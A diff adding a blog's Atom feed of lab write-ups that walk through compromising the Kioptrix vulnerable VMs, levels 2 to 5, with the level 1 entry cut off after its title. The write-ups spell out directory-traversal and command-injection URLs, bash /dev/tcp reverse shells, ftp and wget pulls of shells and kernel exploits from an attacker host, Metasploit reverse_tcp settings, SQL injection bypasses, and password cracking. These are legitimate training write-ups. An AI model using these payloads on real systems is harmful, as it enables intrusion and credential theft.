@@ -1,0 +1,1063 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: kioptrix | Bob1Bob2]]></title>
+  <link href="http://wg135.github.io/blog/categories/kioptrix/atom.xml" rel="self"/>
+  <link href="http://wg135.github.io/"/>
+  <updated>2017-01-25T13:58:13-06:00</updated>
+  <id>http://wg135.github.io/</id>
+  <author>
+    <name><![CDATA[Bob1Bob2]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Kioptrix2014 (#5)]]></title>
+    <link href="http://wg135.github.io/blog/2016/07/07/kioptrix2014-number-5/"/>
+    <updated>2016-07-07T14:27:35-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/07/07/kioptrix2014-number-5</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Nikto</li>
+<li>User Agent Switcher</li>
+</ul>
+
+
+<h3>Vulnerability:</h3>
+
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/21665/">phptax 0.8 - Remote Code Execution Vulnerability</a></li>
+<li><a href="https://www.exploit-db.com/exploits/31173/">pChart2.1.3 Directory Traversal Vulnerability</a></li>
+<li><a href="https://www.exploit-db.com/exploits/26368/">FreeBSD 9.0-9.1 mmap/ptrace - Privilege Esclation Exploit</a></li>
+<li><a href="https://www.exploit-db.com/exploits/28718/">FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation Exploit</a></li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.193 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.193 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 80 and 8080 are opening</p>
+
+<p>use nikto to scan</p>
+
+<p><code>nikto -h 192.168.79.193</code></p>
+
+<p>nothing cool.</p>
+
+<p>Use firefox to check the page port 80</p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>just simple It works</p>
+
+<p>port 8080</p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>got forbidden. Great :(</p>
+
+<p>now go back to port 80 and check the source code</p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find pchart2.1.3. <a href="http://www.pchart.net/">pchart</a>. I googled pchart2.1.3, find exploits <a href="https://www.exploit-db.com/exploits/31173/">pChart 2.1.3 - Multiple Vulnerabilities</a>. I will use directory traversal.</p>
+
+<p><code>http://192.168.79.193/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>got passwd file, this is good, but not godd enough because I cannot shadow file.</p>
+
+<p>Since Nmap determinate the target OS is FreeBSD, the Apache configure file is /usr/local/etc/apache2x/httpd.conf`. <a href="https://www.freebsd.org/doc/handbook/network-apache.html">Apache HTTP Server</a></p>
+
+<p><code>192.168.79.193/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf</code></p>
+
+<p>Here I find:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>The port 8080 only allow Mozilla/4.0 user-agent.  I use User Agent Switcher (firefox plugin) to change my user-agent to <code>Mozilla/4.0</code>, then visit 192.168.79.193:8080</p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now search phptax</p>
+
+<p><code>searchsploit phptax</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>test upload php shell first:</p>
+
+<p><code>http://192.168.79.193:8080/phptax/index.php?pfilez=1040pg1.tob; uname &gt; test.txt&amp;pdf=make</code></p>
+
+<p><code>http://192.168.79.193:8080/phptax/test.txt</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Here I tired to wget the php shell from my http server didn&rsquo;t work. I also tried to write php shell to a php file driectly, also failed. Now I use ftp to upload my shell:</p>
+
+<p>check if ftp is availabe:</p>
+
+<p><code>http://192.168.79.193:8080/phptax/index.php?pfilez=1040pg1.tob;which ftp &gt;test1.txt; &amp;pdf=make</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>php reverse shell:</p>
+
+<p><code>/usr/share/webshells/php/php-reverse-shell.php</code></p>
+
+<p>change the IP address:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>upload the shell using <a href="ftp:">ftp:</a></p>
+
+<p><code>http://192.168.79.193:8080/phptax/index.php?pfilez=1040pg1.tob;ftp -4 -d -v ftp://bobftpusername:bobftppassword@192.168.79.173//reverse.php; &amp;pdf=make</code></p>
+
+<p>set up nc listener</p>
+
+<p>get the shell:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the kernel version</p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Its FreeBSD 9.0-RELEASE, <code>searchsploit freebsd 9.0</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>copy these two exploits to /ftphome/</p>
+
+<p>download them to the target:</p>
+
+<p><code>ftp -4 -d -v ftp://bobftpusername:bobftppassward@192.168.79.173//26368.c</code>
+<code>ftp -4 -d -v ftp://bobftpusername:bobftppassward@192.168.79.173//28718.c</code></p>
+
+<p>get the F***ing root:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Vulhub Kioptrix Level 4]]></title>
+    <link href="http://wg135.github.io/blog/2016/06/15/vulhub-kioptrix-level-4/"/>
+    <updated>2016-06-15T16:10:59-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/06/15/vulhub-kioptrix-level-4</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>wfuzz</li>
+<li>nikto</li>
+<li>zap</li>
+<li>Burpsuite</li>
+<li>Sqlmap</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.190 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.190 -p-</code></p>
+
+<pre><code># nmap -sV -v -O -A -T5 192.168.79.190 -p-
+
+Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-15 16:14 CDT
+NSE: Loaded 138 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 16:14
+Completed NSE at 16:14, 0.00s elapsed
+Initiating NSE at 16:14
+Completed NSE at 16:14, 0.00s elapsed
+Initiating ARP Ping Scan at 16:14
+Scanning 192.168.79.190 [1 port]
+Completed ARP Ping Scan at 16:14, 0.00s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 16:14
+Completed Parallel DNS resolution of 1 host. at 16:14, 1.99s elapsed
+Initiating SYN Stealth Scan at 16:14
+Scanning 192.168.79.190 [65535 ports]
+Discovered open port 445/tcp on 192.168.79.190
+Discovered open port 139/tcp on 192.168.79.190
+Discovered open port 80/tcp on 192.168.79.190
+Discovered open port 22/tcp on 192.168.79.190
+Completed SYN Stealth Scan at 16:14, 11.91s elapsed (65535 total ports)
+Initiating Service scan at 16:14
+Scanning 4 services on 192.168.79.190
+Completed Service scan at 16:14, 11.02s elapsed (4 services on 1 host)
+Initiating OS detection (try #1) against 192.168.79.190
+NSE: Script scanning 192.168.79.190.
+Initiating NSE at 16:14
+Completed NSE at 16:15, 15.56s elapsed
+Initiating NSE at 16:15
+Completed NSE at 16:15, 0.01s elapsed
+Nmap scan report for 192.168.79.190
+Host is up (0.00033s latency).
+Not shown: 39528 closed ports, 26003 filtered ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
+|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
+80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+|_http-title: Site doesn't have a title (text/html).
+139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+MAC Address: 00:0C:29:EA:4D:22 (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Uptime guess: 0.001 days (since Wed Jun 15 16:13:14 2016)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=203 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| Names:
+|   KIOPTRIX4&lt;00&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|   KIOPTRIX4&lt;03&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|   KIOPTRIX4&lt;20&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|_  WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.28a)
+|   Computer name: Kioptrix4
+|   NetBIOS computer name: 
+|   Domain name: localdomain
+|   FQDN: Kioptrix4.localdomain
+|_  System time: 2016-06-15T17:15:00-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server doesn't support SMBv2 protocol
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.33 ms 192.168.79.190
+
+NSE: Script Post-scanning.
+Initiating NSE at 16:15
+Completed NSE at 16:15, 0.00s elapsed
+Initiating NSE at 16:15
+Completed NSE at 16:15, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.54 seconds
+           Raw packets sent: 91558 (4.029MB) | Rcvd: 39548 (1.583MB)
+</code></pre>
+
+<p>Services ssh, http and smb are running.</p>
+
+<h3>check HTTP service:</h3>
+
+<p>use wfuzz to scan:</p>
+
+<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.190/FUZZ 2&gt;/dev/null</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use nikto to scan:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<h3>check SMB service:</h3>
+
+<p>use enum4linux to enumerate SMB:</p>
+
+<p><code>enum4linux -a 192.168.79.190</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>I searched exploitdb and metasploit and tried serveral exploits to SMB, failed.</p>
+
+<p>Now I turn to http service.</p>
+
+<p>use zap to scan:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like there is a SQL injection in parameter mypassword.</p>
+
+<p>use Burp to check:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>save the POST request to a file called test.txt</p>
+
+<p>run sqlmap to dump the credential:</p>
+
+<p><code>sqlmap -r test.txt -p mypassword --dump</code></p>
+
+<p>get:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now try to login to web and see if I can upload webshell:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Nothing excited.</p>
+
+<p>Okay, try to login via SSH:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>It is an limited shell:</p>
+
+<p>&lsquo;ls -ahlR /root/&rsquo;</p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>After google it, I found it may be lshell</p>
+
+<p><a href="https://github.com/ghantoos/lshell">lshell</a></p>
+
+<p>lshell is a shell coded in Python, that lets you restrict a user&rsquo;s environment to limited sets of commands, choose to enable/disable any command over SSH (e.g. SCP, SFTP, rsync, etc.), log user&rsquo;s commands, implement timing restriction, and more.</p>
+
+<p>looks like it support command echo, try to get bash:</p>
+
+<p><code>echo os.system("/bin/bash")</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Got the shell now!</p>
+
+<p>start to get root&hellip;</p>
+
+<p>Enumeration stage,</p>
+
+<p><code>uname -a</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>searchsploit linux kernel 2.6 | grep local</code> and I pick sendpage one</p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>download the exploit to /var/www/html/:</p>
+
+<p><code>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/9641.tar.gz</code></p>
+
+<p>start web server:</p>
+
+<p><code>service apache2 start</code></p>
+
+<p>in kioptrix4</p>
+
+<p><code>wget http://192.168.79.173/9641.tar.gz</code></p>
+
+<p>hang there, maybe iptable block the traffic to port 80</p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>I tried <code>/bin/bash -i &gt; /dev/tcp/192.168.79.173/1234 0&lt;&amp;1</code> also doesn&rsquo;t work</p>
+
+<p>finally I used python SimpleHTTPServer:</p>
+
+<p><code>service apache2 stop</code>
+<code>python -m SimpleHTTPServer</code></p>
+
+<p>in kioptrix4</p>
+
+<p><code>wget 192.168.79.173:8000/9641.tar.gz</code></p>
+
+<p>unzip it:</p>
+
+<p><code>tar zxvf 9641.tar.gz</code></p>
+
+<p>try to compile it, cannot find gcc. WTF</p>
+
+<p>search it</p>
+
+<p><code>whereis gcc</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>this is a folder, and it is i486-linux-gnu, check kioptrix4&rsquo;s architecture.</p>
+
+<p><code>uname -m</code>
+It is i686. Oh different&hellip;.</p>
+
+<p>Luckly, my kali is i686, I just compile on my kali and upload to kioptrix4</p>
+
+<p>run it</p>
+
+<p>get the root:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[vulhub-Kioptrix Level 3]]></title>
+    <link href="http://wg135.github.io/blog/2016/06/09/vulhub-kiotrix3/"/>
+    <updated>2016-06-09T11:42:38-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/06/09/vulhub-kiotrix3</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Nikto</li>
+<li>Metasploit</li>
+<li>Wfuzz</li>
+<li>Hashcat</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.184 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.184 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Ports 22 and 80 are opening.</p>
+
+<p>Now use Nikto to scan:</p>
+
+<p><code>nikto -h 192.168.79.184</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Nothing excited.</p>
+
+<p>Now lets browser the web page in the target.</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Find the target may use LotusCMS.</p>
+
+<p>In msfconsole:</p>
+
+<p><code>search LotusCMS</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find one exploit</p>
+
+<pre><code>msf &gt; use exploit/multi/http/lcms_php_exec 
+msf exploit(lcms_php_exec) &gt; set rhost 192.168.79.184
+msf exploit(lcms_php_exec) &gt; set uri 
+msf exploit(lcms_php_exec) &gt; set payload php/meterpreter/reverse_tcp
+msf exploit(lcms_php_exec) &gt; set lhost 192.168.79.173
+exploit
+</code></pre>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Got the shell, next step is try to get root.</p>
+
+<p>In this step, I tried to enumeration all kinds of shit and use serveral vernerable kernel exploits to get the root but failed. During the emumeration. I found a ffile gconfig.php is interesting. Then I found that:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>maybe the  username/password for ssh, but no. Thats too easy.</p>
+
+<p>So that I go back to use wfuzz the scan the http services.</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like it has phpmyadmin. Try that:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Log in using the username/password that just found. Successed.</p>
+
+<p>review the content, found this:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now found two users and the hashed passwords:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Copy the passwords to a file use hashcat to crack it:</p>
+
+<p><code>hashcat hash.txt /user/share/wordlists/rockyou.txt</code></p>
+
+<p>get both passwords:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>ssh to the target, search the SUID binaries:</p>
+
+<p><code>find / -perm +6000 -type f -exec ls -ld {} \;</code></p>
+
+<p>found an interesting file /uss/local/bin/ht, I googled it and found it is a hex editor.</p>
+
+<p>now try to use it to open /etc/sudoers file, get error message. to fix it:</p>
+
+<p><code>export TERM=xterm</code></p>
+
+<p>change the loneferret permission:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the root</p>
+
+<p><img src="/images/blog/vulhub/kioptrix3/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[vulhub-Kioptrix Level 2]]></title>
+    <link href="http://wg135.github.io/blog/2016/06/07/vulhub-kioptrix2/"/>
+    <updated>2016-06-07T15:56:48-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/06/07/vulhub-kioptrix2</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>zap</li>
+<li>netcat</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.183 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.183 -p-</code></p>
+
+<p>Opening ports: 22, 111, 139, 80, 443, 1024.</p>
+
+<pre><code>Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-07 16:07 CDT
+NSE: Loaded 138 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 16:07
+Completed NSE at 16:07, 0.00s elapsed
+Initiating NSE at 16:07
+Completed NSE at 16:07, 0.00s elapsed
+Initiating ARP Ping Scan at 16:07
+Scanning 192.168.79.183 [1 port]
+Completed ARP Ping Scan at 16:07, 0.00s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 16:07
+Completed Parallel DNS resolution of 1 host. at 16:08, 13.00s elapsed
+Initiating SYN Stealth Scan at 16:08
+Scanning 192.168.79.183 [65535 ports]
+Discovered open port 443/tcp on 192.168.79.183
+Discovered open port 3306/tcp on 192.168.79.183
+Discovered open port 111/tcp on 192.168.79.183
+Discovered open port 22/tcp on 192.168.79.183
+Discovered open port 80/tcp on 192.168.79.183
+Discovered open port 666/tcp on 192.168.79.183
+Discovered open port 631/tcp on 192.168.79.183
+Completed SYN Stealth Scan at 16:08, 3.99s elapsed (65535 total ports)
+Initiating Service scan at 16:08
+Scanning 7 services on 192.168.79.183
+Completed Service scan at 16:08, 16.01s elapsed (7 services on 1 host)
+Initiating OS detection (try #1) against 192.168.79.183
+NSE: Script scanning 192.168.79.183.
+Initiating NSE at 16:08
+Completed NSE at 16:08, 2.14s elapsed
+Initiating NSE at 16:08
+Completed NSE at 16:08, 0.00s elapsed
+Nmap scan report for 192.168.79.183
+Host is up (0.00052s latency).
+Not shown: 65528 closed ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
+| ssh-hostkey: 
+|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
+|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
+|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
+|_sshv1: Server supports SSHv1
+80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.0.52 (CentOS)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+111/tcp  open  rpcbind  2 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1            663/udp  status
+|_  100024  1            666/tcp  status
+443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.0.52 (CentOS)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: md5WithRSAEncryption
+| Not valid before: 2009-10-08T00:10:47
+| Not valid after:  2010-10-08T00:10:47
+| MD5:   01de 29f9 fbfb 2eb2 beaf e624 3157 090f
+|_SHA-1: 560c 9196 6506 fb0f fb81 66b1 ded3 ac11 2ed4 808a
+|_ssl-date: 2016-06-07T17:59:07+00:00; -3h09m26s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+631/tcp  open  ipp      CUPS 1.1
+| http-methods: 
+|   Supported Methods: GET HEAD OPTIONS POST PUT
+|_  Potentially risky methods: PUT
+|_http-server-header: CUPS/1.1
+|_http-title: 403 Forbidden
+666/tcp  open  status   1 (RPC #100024)
+3306/tcp open  mysql    MySQL (unauthorized)
+MAC Address: 00:0C:29:55:D2:EE (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.30
+Uptime guess: 0.018 days (since Tue Jun  7 15:42:38 2016)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=201 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.52 ms 192.168.79.183
+
+NSE: Script Post-scanning.
+Initiating NSE at 16:08
+Completed NSE at 16:08, 0.00s elapsed
+Initiating NSE at 16:08
+Completed NSE at 16:08, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 37.28 seconds
+           Raw packets sent: 65555 (2.885MB) | Rcvd: 65551 (2.623MB)
+</code></pre>
+
+<p>Use Nikto to scan  the web service.</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>not so excited.</p>
+
+<p>check the webpage:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>may contain SQL injection. Use zap to scan:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Finally try username as <code>test</code>, password <code>test' or '1'=1'</code> can bypass the login.</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Now I am looking for command injection:</p>
+
+<p>try:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Okay. Now set up netcat on port 4444 and in the web console:</p>
+
+<p><code>/bin/bash -i &gt; /dev/tcp/[yourip]/[port] 0&lt;&amp;1</code></p>
+
+<p>get the shell:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>But not the root. Keep going&hellip;</p>
+
+<p>After enumeration, I found the kernel version is 2.6.9. Now search the exploit</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Find an interestig one. I tried other exploits too, but failed..</p>
+
+<p>Upload it to the target, compile and run it. ROOT:</p>
+
+<p><img src="/images/blog/vulhub/kioptrix2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Vulhub-Kioptrix level 1]]></title>
